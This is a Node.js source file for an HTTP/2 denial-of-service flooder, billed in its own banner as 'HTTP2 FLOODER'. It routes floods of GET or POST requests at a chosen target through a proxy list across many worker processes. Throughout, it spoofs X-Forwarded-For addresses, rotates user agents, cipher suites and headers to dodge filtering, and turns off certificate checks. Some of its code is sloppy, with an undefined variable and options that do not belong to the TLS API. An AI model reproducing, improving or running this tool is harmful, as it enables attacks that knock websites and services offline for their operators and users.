process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
const tls = require('tls');
const net = require('net');

var path = require("path");
const cluster = require('cluster');
const http2 = require('http2');
colors = require('colors');

var fileName = __filename;
var file = path.basename(fileName);

let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;

if (process.argv.length < 8){
    console['log']('		HTTP/2 By Virtualizaion' ['red']['bold']);
    console.log('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads>');
    //console.log(process.argv.length);
    process.exit(0);
}

let randomparam = false;

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

process.argv.forEach((ss) => {
    if (ss.includes("cookie=") && !process.argv[2].split('""')[0].includes(ss)){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=") && !process.argv[2].split('""')[0].includes(ss)){
        if (process.argv[2].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("(!) RandomString Mode");
    } else if (ss.includes("headerdata=")){
        headerbuilders = {
            "Cache-Control": "max-age=0",
            "Referer":target,
            "X-Forwarded-For":spoof(),
            "Cookie":COOKIES,
            ":method":"GET"
        };
        if (ss.slice(11).split('""')[0].includes("&")) {
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders[head] = dat;
            }
        } else {
            const hddata = ss.slice(11).split('""')[0];
            const head = hddata.split("=")[0];
            const dat = hddata.split("=")[1];
            headerbuilders[head] = dat;
        }
    }
});
if (COOKIES !== undefined){
    console.log("(!) Custom Cookie Mode");
} else {
    COOKIES = "";
}
if (POSTDATA !== undefined){
    console.log("(!) Custom PostData Mode");
} else {
    POSTDATA = "";
}
if (headerbuilders !== undefined){
    console.log("(!) Custom HeaderData Mode");
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`[Info] Threads ${i} Started Attacking`);
        }
        console['log']('──────▄▀▄─────▄▀▄'['yellow']['bold']);
        console['log']('─────▄█░░▀▀▀▀▀░░█▄'['yellow']['bold']);       
        console['log']('─▄▄──█░░░░░░░░░░░█──▄▄[Info] NOW ATTACKED | HTTP2 FLOODER'['yellow']['bold']); 
        console['log']('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█'['yellow']['bold']);
    
        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
} else {
    headerbuilders = {
        "Cache-Control": "max-age=0",
        "Referer":target,
        "X-Forwarded-For":spoof(),
        "Cookie":COOKIES,
        ":method":"GET"
    }
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`[Info] Threads ${i} Started Attacking`);
        }
        console['log']('──────▄▀▄─────▄▀▄'['yellow']['bold']);
        console['log']('─────▄█░░▀▀▀▀▀░░█▄'['yellow']['bold']);       
        console['log']('─▄▄──█░░░░░░░░░░░█──▄▄[Info] NOW ATTACKED | HTTP2 FLOODER'['yellow']['bold']); 
        console['log']('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█'['yellow']['bold']);
    
        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
}

var parsed = url.parse(target);
process.setMaxListeners(0);

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":4
    });
    return rsdat;
}
const sigalgs = [
'ecdsa_secp256r1_sha256',
'ecdsa_brainpoolP256r1tls13_sha256',
'ecdsa_brainpoolP384r1tls13_sha384',
'ecdsa_brainpoolP512r1tls13_sha512',
'ecdsa_sha1',
'ed25519',
'ed448',
'rsa_pkcs1_sha1',
'rsa_pkcs1_sha256',
'rsa_pkcs1_sha384',
'rsa_pss_pss_sha256',
'rsa_pss_pss_sha384',
'rsa_pss_pss_sha512',
'sm2sig_sm3',           
'ecdsa_secp384r1_sha384',
'ecdsa_secp521r1_sha512',
'rsa_pss_rsae_sha256',
'rsa_pss_rsae_sha384',
'rsa_pss_rsae_sha512',
'rsa_pkcs1_sha512',
];

let SignalsList = sigalgs.join(':');
this.sigalgs = SignalsList;
try {
var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
} catch(error){
 console.log('Fail to load ua.txt')
}



function spoof(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "DHE-RSA-AES128-CCM",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "DHE-PSK-AES128-GCM-SHA256",
    "DHE-RSA-AES256-CCM",
    "DHE-PSK-AES128-CCM8",
    "DHE-DSS-AES128-GCM-SHA256",
    "TLS_AES_128_GCM_SHA256",
    "DHE-PSK-AES256-GCM-SHA384",
    "DHE-PSK-AES256-CCM8",
    "DHE-RSA-AES128-CCM8",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "DHE-PSK-AES128-CCM",
    "TLS_AES_256_GCM_SHA384",
    "DHE-RSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-CCM",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "DHE-PSK-AES256-CCM",
    "TLS_AES_128_CCM_SHA256",
    "ECDHE-ECDSA-AES128-CCM8",
    "DHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "DHE-DSS-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-CCM8",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES128-CCM",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "ALL:!aNULL:!ADH:!eNULL:!LOW:!EXP:RC4+RSA:+HIGH:+MEDIUM",
    "ALL:!aNULL:!eNULL",
    "EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];
accept_header = [    
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*',
    'image/avif,image/webp,*/*',
    'image/webp,*/*',
    'image/png,image/*;q=0.8,*/*;q=0.5',
    'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'image/png,image/svg+xml,image/*;q=0.8, */*;q=0.5',
    'text/css,*/*;q=0.1',
    'text/css',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
];
lang_header = [
    "ko-KR",
    "en-US",
    "zh-CN",
    "zh-TW",
    "ja-JP",
    "en-GB",
    "en-AU",
    "en-CA",
    "en-NZ",
    "en-ZA",
    "en-IN",
    "en-PH",
    "en-SG",
    "en-HK",
    "*",
    "en-US,en;q=0.5",
    "utf-8, iso-8859-1;q=0.5, *;q=0.1",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-GB, en-US, en;q=0.9",
    "de-AT, de-DE;q=0.9, en;q=0.5",
    "cs;q=0.5",
    "da, en-gb;q=0.8, en;q=0.7",
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9",
    "de-CH;q=0.7",
    "tr",
];
encoding_header = [
    "*",
    "gzip, deflate",
    "br;q=1.0, gzip;q=0.8, *;q=0.1",
    "gzip",
    "gzip, compress",
    "compress, deflate",
    "compress",
    "gzip, deflate, br",
    "deflate",
    "gzip, deflate, lzma, sdch",
    "deflate",
];
controle_header = [
    'max-age=604800',
    's-maxage=604800',
    'max-stale',
    'min-fresh',
    'private',
    'public',
    'no-cache',
    'no-store',
    'no-transform',
    'stale-if-error',
    'only-if-cached',
    'max-age=0',
    'must-understand, no-store',
    'public, max-age=604800, immutable',
    'max-age=604800, stale-while-revalidate=86400',
    'max-stale=3600',
    'min-fresh=600',
    'max-age=31536000, immutable',
    'max-age=604800, stale-if-error=86400',
    'public, max-age=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
        //console.warn(e);
    }).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
        //console.warn(e);
    }).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
        //console.warn(e);
    }).setMaxListeners(0);
function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}
function startflood(){

    if (process.argv[2].toUpperCase() == "POST"){
        const tagpage = url.parse(target).path.replace("%RAND%",ra())
        headerbuilders[":method"] = "POST"
        headerbuilders["Content-Type"] = "text/plain"
        if (randomparam) {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var cipper = cipher()

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                
                var header = {
                    ":path": parsed.path,
                    "X-Forwarded-For": proxy[0],
                    "X-Forwarded-Host": proxy[0], 
                    ":method": "GET",
                    "User-agent": uas,
                    "Origin": target,
                    "Accept": accept(),
                    "Accept-Encoding": encoding(),
                    "Accept-Language": lang(),
                    "Cache-Control": controling(),
                }

                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                tls.DEFAULT_ECDH_CURVE;
                tls.authorized = true;
                tls.sync = true;
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    headers: {
                        'Host': parsed.host,
                        'Proxy-Connection': 'Keep-Alive',
                        'Connection': 'Keep-Alive',
                    },
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                curve: "GREASE:X25519:x25519",
                                strictSSL: false,
          rejectUnauthorized: false,
          challengesToSolve: 5,
          cloudflareTimeout: 5000,
          cloudflareMaxTimeout: 30000,
          maxRedirects: 20,
          followAllRedirects: true,
          decodeEmails: false,
          resolveWithFullResponse: true,
                        HonorCipherOrder: true,
                        echdCurve: this.curve,
                        Compression: false,
                        UseStapling: true,
                        SessionTickets: false,
                        requestCert: true,
          gzip: true,
                                secure: true,
                                port: 443,
                                port: 80,
                                sigals: 'rsa_pss_rsae_sha256',
                                sigalgs: this.sigalgs,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                tls.DEFAULT_ECDH_CURVE;
                tls.authorized = true;
                tls.sync = true;
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    headers: {
                        'Host': parsed.host,
                        'Proxy-Connection': 'Keep-Alive',
                        'Connection': 'Keep-Alive',
                    },
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                curve: "GREASE:X25519:x25519",
                                rejectUnauthorized: false,
                                challengesToSolve: 5,
                                cloudflareTimeout: 5000,
                                cloudflareMaxTimeout: 30000,
                                resolveWithFullResponse: true,
                        HonorCipherOrder: true,
                        Compression: false,
                        UseStapling: true,
                        echdCurve: this.curve,
                        SessionTickets: false,
                        requestCert: true,
                        strictSSL: false,
                                maxRedirects: 20,
                                followAllRedirects: true,
                                decodeEmails: false,
                                gzip: true,
                                secure: true,
                                port: 443,
                                port: 80,
                                sigals: 'rsa_pss_rsae_sha256',
                                rejectUnauthorized: false,
                                sigalgs: this.sigalgs,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        }
    } else if (process.argv[2].toUpperCase() == "GET") {
        headerbuilders[":method"] = "GET"
        if (randomparam){
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    headers: {
                        'Host': parsed.host,
                        'Proxy-Connection': 'Keep-Alive',
                        'Connection': 'Keep-Alive',
                    },
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                challengesToSolve: 5,
          cloudflareTimeout: 5000,
          cloudflareMaxTimeout: 30000,
          strictSSL: false,
          maxRedirects: 20,
          followAllRedirects: true,
          decodeEmails: false,
          gzip: true,
                                servername: parsed.host,
                                resolveWithFullResponse: true,
                        HonorCipherOrder: true,
                        Compression: false,
                        UseStapling: true,
                        SessionTickets: false,
                        requestCert: true,
                        port: 443,
                        port: 80,
                                secure: true,
                                echdCurve: this.curve,
                                rejectUnauthorized: false,
                                sigalgs: this.sigalgs,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
                tls.DEFAULT_ECDH_CURVE;
                tls.authorized = true;
                tls.sync = true;
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    headers: {
                        'Host': parsed.host,
                        'Proxy-Connection': 'Keep-Alive',
                        'Connection': 'Keep-Alive',
                    },
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                sigalgs: this.sigalgs,
                                curve: "GREASE:X25519:x25519",
                                port: 443,
                                port: 80,
          challengesToSolve: 5,
          cloudflareTimeout: 5000,
          cloudflareMaxTimeout: 30000,
          maxRedirects: 20,
          followAllRedirects: true,
          decodeEmails: false,
          strictSSL: false,
          gzip: true,
                                rejectUnauthorized: false,
                                resolveWithFullResponse: true,
                        HonorCipherOrder: true,
                        Compression: false,
                        UseStapling: true,
                        SessionTickets: false,
                        sigals: 'rsa_pss_rsae_sha256',
                        echdCurve: this.curve,
                        requestCert: true,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        }
    } else {
        console.log("(!) Method Invalid");
        process.exit(1);
    }

}